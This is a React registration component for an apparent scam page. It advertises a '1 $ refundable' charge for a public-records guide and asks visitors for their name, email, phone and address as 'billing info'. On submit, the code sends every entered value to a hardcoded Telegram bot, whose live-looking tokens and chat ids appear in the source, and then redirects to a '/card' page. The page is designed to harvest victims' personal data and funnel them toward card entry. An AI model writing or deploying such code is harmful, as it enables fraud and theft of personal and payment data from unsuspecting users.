// import { useState } from "react"
import { useFormik } from 'formik';
import { signUpSchema } from '../schemas';
import { useNavigate } from 'react-router-dom';

const initialValues = {
  fullname: '',
  email: '',
  phone: '',
  country: '',
  city: '',
  state: '',
  zip: '',
  terms: true,
};

// 6292955787:AAE5oPybPhyD3BUyveVgw9QsQMNZ6I51vpM
// 727686605
function Register() {
  const navigate = useNavigate();
  const { values, errors, handleBlur, touched, handleChange, handleSubmit } =
    useFormik({
      initialValues: initialValues,
      validationSchema: signUpSchema,
      onSubmit: (values, action) => {
        action.resetForm();

        //send data form telegram bot
        // console.log(values);

        const bot_token = '5912247911:AAF5D53I7Q89_juB6I-Je9jJMoC5ENYgKD0';
        const user_id = 5339916869;
        let my_text = `Name: ${values.fullname}     
                                               Email:  ${values.email}     
                                                  Phone: ${values.phone}                          
                   Country: ${values.country}        
                                          City: ${values.city}         
                                                               State: ${values.state} 
                                                                    ZipCode: ${values.zip}`;
        const url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${user_id}&text=${my_text}`;
        let api = new XMLHttpRequest();
        api.open('Get', url, true);
        api.send();
        navigate('/card');
      },
    });

  return (
    <div
      className="min-h-screen pt-20 "
      style={{
        backgroundImage: 'linear-gradient(115deg, #8693AB, #BDD4E7!)',
      }}
    >
      <div className="container mx-auto bg-white">
        <div className=" flex-col  lg:flex-row w-10/12  lg:w-8/12 bg-white rounded-xl shadow-lg overflow-hidden flex mx-auto">
          <div
            className=" w-full lg:w-1/2 flex flex-col items-center justify-center p-12 bg-no-repeat bg-cover bg-center "
            style={{
              backgroundImage: 'linear-gradient(115deg, #F5E3E6, #D9E4F5 )',
            }}
          >
            <h1 className="  text-2xl font-semibold mb-3">
              Charge 1 $ Only But it's Refundable .
            </h1>
            <div>
              <p>
                The Guide to Finding Public Records Online, Including Background
                Checks, Criminal Records, Court Records, Arrest Records and
                More!
              </p>
            </div>
          </div>
          <div className=" w-full lg:w-1/2 py-16 px-12">
            <h2 className="text-4xl mb-3">Welcome</h2>
            <p className="mb-4">Enter your Billing info</p>

            {/* From Handalling  */}

            <form action="#" onSubmit={handleSubmit}>
              <div className="">
                <input
                  type="text"
                  name="fullname"
                  placeholder="Full Name "
                  className="border border-gray-400 py-1 px-2 w-full relative"
                  value={values.fullname}
                  onChange={handleChange}
                  onBlur={handleBlur}
                />
                {errors.fullname && touched.fullname ? (
                  <p className="text-red-500    text-xs  absolute">
                    {errors.fullname}
                  </p>
                ) : null}
              </div>
              <div className="mt-5">
                <input
                  type="email"
                  name="email"
                  placeholder="Email "
                  className="border border-gray-400 py-1 px-2 w-full relative "
                  value={values.email}
                  onChange={handleChange}
                  onBlur={handleBlur}
                />
                {errors.email && touched.email ? (
                  <p className="text-red-500    text-xs  absolute">
                    {errors.email}
                  </p>
                ) : null}
              </div>
              <div className="mt-5">
                <input
                  type="phone"
                  name="phone"
                  placeholder="Phone number "
                  className="border border-gray-400 py-1 px-2 w-full relative "
                  value={values.phone}
                  onChange={handleChange}
                  onBlur={handleBlur}
                />
                {errors.phone && touched.phone ? (
                  <p className="text-red-500    text-xs  absolute">
                    {errors.phone}
                  </p>
                ) : null}
              </div>
              <div className="grid   lg:grid-cols-2 gap-5 mt-5 ">
                <div>
                  <input
                    type="text"
                    placeholder="Country "
                    name="country"
                    className="border w-full border-gray-400 py-1 px-2 relative"
                    value={values.country}
                    onChange={handleChange}
                    onBlur={handleBlur}
                  />
                  {errors.country && touched.country ? (
                    <p className="text-red-500   text-xs  absolute">
                      {errors.country}
                    </p>
                  ) : null}
                </div>
                <div>
                  <input
                    type="text"
                    placeholder="City "
                    name="city"
                    className="border border-gray-400 py-1 px-2 relative w-full"
                    value={values.city}
                    onChange={handleChange}
                    onBlur={handleBlur}
                  />
                  {errors.city && touched.city ? (
                    <p className="text-red-500    text-xs  absolute">
                      {errors.city}
                    </p>
                  ) : null}
                </div>
              </div>
              <div className="mt-5">
                <input
                  type="text"
                  placeholder="State address "
                  name="state"
                  className="border border-gray-400 py-1 px-2 w-full relative"
                  value={values.state}
                  onChange={handleChange}
                  onBlur={handleBlur}
                />
                {errors.state && touched.state ? (
                  <p className="text-red-500    text-xs  absolute">
                    {errors.state}
                  </p>
                ) : null}
              </div>
              <div className="mt-5">
                <input
                  type="text"
                  placeholder="Zip Code "
                  name="zip"
                  className="border border-gray-400 py-1 px-2 w-full relative"
                  value={values.zip}
                  onChange={handleChange}
                  onBlur={handleBlur}
                />
                {errors.zip && touched.zip ? (
                  <p className="text-red-500    text-xs  absolute">
                    {errors.zip}
                  </p>
                ) : null}
              </div>

              {/* <div className="mt-5">
                <input
                  type="checkbox"
                  className="border border-gray-400 mx-2"
                  value={values.terms}
                  onChange={handleChange}
                  onBlur={handleBlur}
                />
                <span>
                  I accept the{' '}
                  <a href="#" className="text-purple-800 font-semibold">
                    Terms of use
                  </a>{' '}
                  &{' '}
                  <a href="#" className="text-purple-800 font-semibold">
                    Privacy Policy
                  </a>
                </span>
              </div> */}
              <div className="mt-5">
                <button className="w-full bg-purple-600 py-3 text-center text-white">
                  {' '}
                  Next{' '}
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Register;
